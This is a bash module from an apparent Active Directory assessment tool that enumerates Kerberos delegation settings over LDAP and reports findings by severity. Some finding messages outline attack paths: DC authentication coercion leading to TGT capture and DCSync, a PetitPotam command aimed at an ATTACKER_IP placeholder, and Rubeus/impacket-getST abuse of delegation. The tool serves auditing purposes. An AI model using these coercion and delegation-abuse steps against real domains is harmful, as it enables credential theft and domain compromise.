#!/bin/bash
################################################################################
# MODULE: Delegation Enumeration - COMPLETE FIX
# Coverage: Unconstrained, Constrained, RBCD
# FIX: Shows actual computer/user names in ALL findings
################################################################################

run_delegation_enum() {
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║  PHASE 4: Delegation Configurations                                   ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Unconstrained delegation - COMPUTERS
    run_ldap "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
        "delegation/01_unconstrained_computers.ldif" "Finding computers with unconstrained delegation" "sAMAccountName dNSHostName primaryGroupID"
    
    local uncon_comp_count=$(grep -c "^dn:" "delegation/01_unconstrained_computers.ldif" 2>/dev/null || echo 0)
    uncon_comp_count="${uncon_comp_count//[^0-9]/}"
    [ -z "$uncon_comp_count" ] && uncon_comp_count=0
    
    if [ "$uncon_comp_count" -gt 0 ]; then
        # FIX: Extract actual computer names (both sAMAccountName and dNSHostName)
        local all_computers=""
        
        # Get sAMAccountNames
        while IFS= read -r line; do
            if [[ "$line" == sAMAccountName:* ]]; then
                local comp=$(echo "$line" | awk '{print $2}')
                all_computers="${all_computers}${comp} "
            elif [[ "$line" == dNSHostName:* ]]; then
                local dns=$(echo "$line" | awk '{print $2}')
                all_computers="${all_computers}(${dns}) "
            fi
        done < "delegation/01_unconstrained_computers.ldif"
        
        # Check if any are NOT domain controllers (exclude DC in name)
        local non_dc_list=""
        local non_dc_count=0
        
        # A computer is a DC if its primaryGroupID is 516 (Domain Controllers)
        # or 521 (Read-only Domain Controllers), or it lives in the Domain
        # Controllers OU. primaryGroupID is authoritative; the DN check is a
        # fallback. (The previous "name starts with DC/WIN-...DC" heuristic both
        # missed oddly-named DCs and wrongly excluded non-DCs with "DC" in the
        # name.) Reads via process substitution so the counter persists; a
        # sentinel flushes the final entry.
        local current_dn="" current_sam="" current_dns="" current_pgid=""
        while IFS= read -r line; do
            case "$line" in
                dn:*)
                    if [ -n "$current_sam" ]; then
                        local is_dc=false
                        [ "$current_pgid" = "516" ] && is_dc=true
                        [ "$current_pgid" = "521" ] && is_dc=true
                        echo "$current_dn" | grep -qi "Domain Controllers" && is_dc=true
                        if [ "$is_dc" = false ]; then
                            non_dc_list="${non_dc_list}${current_sam}"
                            [ -n "$current_dns" ] && non_dc_list="${non_dc_list} (${current_dns})"
                            non_dc_list="${non_dc_list}, "
                            non_dc_count=$((non_dc_count + 1))
                        fi
                    fi
                    current_dn="$line"; current_sam=""; current_dns=""; current_pgid=""
                    ;;
                sAMAccountName:*) current_sam=$(echo "$line" | awk '{print $2}' | tr -d '$') ;;
                dNSHostName:*)    current_dns=$(echo "$line" | awk '{print $2}') ;;
                primaryGroupID:*) current_pgid=$(echo "$line" | awk '{print $2}' | tr -dc '0-9') ;;
            esac
        done < <(ldif_unfold "delegation/01_unconstrained_computers.ldif"; echo "dn: __SENTINEL__")
        
        # Remove trailing comma and space
        non_dc_list="${non_dc_list%, }"
        
        if [ $non_dc_count -gt 0 ]; then
            add_finding "CRITICAL" "Unconstrained Delegation" \
                "$non_dc_count non-DC computers with unconstrained delegation: $non_dc_list" \
                "Coerce DC auth → Capture TGT → DCSync │ Tools: PetitPotam (python3 PetitPotam.py ATTACKER_IP TARGET_IP), PrinterBug, Rubeus"
        else
            add_finding "INFO" "Unconstrained Delegation" \
                "Only Domain Controllers have unconstrained delegation (expected)" ""
        fi
    fi
    
    # Unconstrained delegation - USERS
    run_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
        "delegation/01_unconstrained_users.ldif" "Finding users with unconstrained delegation" "sAMAccountName"
    
    local uncon_user_count=$(grep -c "^dn:" "delegation/01_unconstrained_users.ldif" 2>/dev/null || echo 0)
    uncon_user_count="${uncon_user_count//[^0-9]/}"
    [ -z "$uncon_user_count" ] && uncon_user_count=0
    
    if [ "$uncon_user_count" -gt 0 ]; then
        # FIX: Extract actual usernames
        local uncon_users=$(ldif_values sAMAccountName "delegation/01_unconstrained_users.ldif" | sort -u | tr '\n' ',' | sed 's/,$//')

        add_finding "CRITICAL" "Unconstrained Delegation" \
            "$uncon_user_count user accounts with unconstrained delegation: $uncon_users" \
            "Can impersonate ANY user in domain! For each account: Set-ADAccountControl -Identity USERNAME -TrustedForDelegation \$false"
    fi
    
    # Constrained delegation
    run_ldap "(msDS-AllowedToDelegateTo=*)" \
        "delegation/02_constrained.ldif" "Finding constrained delegation" "sAMAccountName msDS-AllowedToDelegateTo"
    
    local const_count=$(grep -c "^dn:" "delegation/02_constrained.ldif" 2>/dev/null || echo 0)
    const_count="${const_count//[^0-9]/}"
    [ -z "$const_count" ] && const_count=0
    
    if [ "$const_count" -gt 0 ]; then
        # FIX: Extract accounts and their delegation targets
        local const_accounts=$(grep "sAMAccountName:" "delegation/02_constrained.ldif" | awk '{print $2}' | head -5 | tr '\n' ',' | sed 's/,$//')
        
        # Also show what they can delegate to
        local delegate_targets=$(grep "msDS-AllowedToDelegateTo:" "delegation/02_constrained.ldif" | awk '{print $2}' | head -3 | tr '\n' ',' | sed 's/,$//')
        
        add_finding "HIGH" "Constrained Delegation" \
            "$const_count accounts with constrained delegation: $const_accounts → Can delegate to: $delegate_targets" \
            "Review delegation/02_constrained.ldif for full details. Exploit with Rubeus or impacket-getST"
    fi
    
    # Resource-Based Constrained Delegation (RBCD)
    run_ldap "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
        "delegation/03_rbcd.ldif" "Finding RBCD configurations" "sAMAccountName"
    
    local rbcd_count=$(grep -c "^dn:" "delegation/03_rbcd.ldif" 2>/dev/null || echo 0)
    rbcd_count="${rbcd_count//[^0-9]/}"
    [ -z "$rbcd_count" ] && rbcd_count=0
    
    if [ "$rbcd_count" -gt 0 ]; then
        # FIX: Extract objects with RBCD
        local rbcd_objects=$(grep "sAMAccountName:" "delegation/03_rbcd.ldif" | awk '{print $2}' | tr '\n' ',' | sed 's/,$//')
        
        add_finding "MEDIUM" "RBCD" \
            "$rbcd_count objects with RBCD configured: $rbcd_objects" \
            "Review msDS-AllowedToActOnBehalfOfOtherIdentity. Potential for S4U2Self/S4U2Proxy attacks"
    fi
    
    # NOTE: "accounts trusted for delegation" (UAC 524288) is already enumerated
    # above as unconstrained-delegation users (delegation/01_unconstrained_users.ldif);
    # the previously duplicated query here produced no additional finding and was
    # removed.

    # Accounts trusted to authenticate for delegation (protocol transition)
    run_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
        "delegation/05_trusted_to_auth.ldif" "Finding accounts trusted to authenticate for delegation"
    
    local auth_del_count=$(grep -c "^dn:" "delegation/05_trusted_to_auth.ldif" 2>/dev/null || echo 0)
    auth_del_count="${auth_del_count//[^0-9]/}"
    [ -z "$auth_del_count" ] && auth_del_count=0
    
    if [ "$auth_del_count" -gt 0 ]; then
        # FIX: Extract accounts
        local auth_accounts=$(grep "sAMAccountName:" "delegation/05_trusted_to_auth.ldif" | awk '{print $2}' | tr '\n' ',' | sed 's/,$//')
        
        add_finding "HIGH" "Protocol Transition" \
            "$auth_del_count accounts with protocol transition (T2A4D): $auth_accounts" \
            "Can obtain service tickets without user's password via S4U2Self"
    fi
    
    echo ""
}
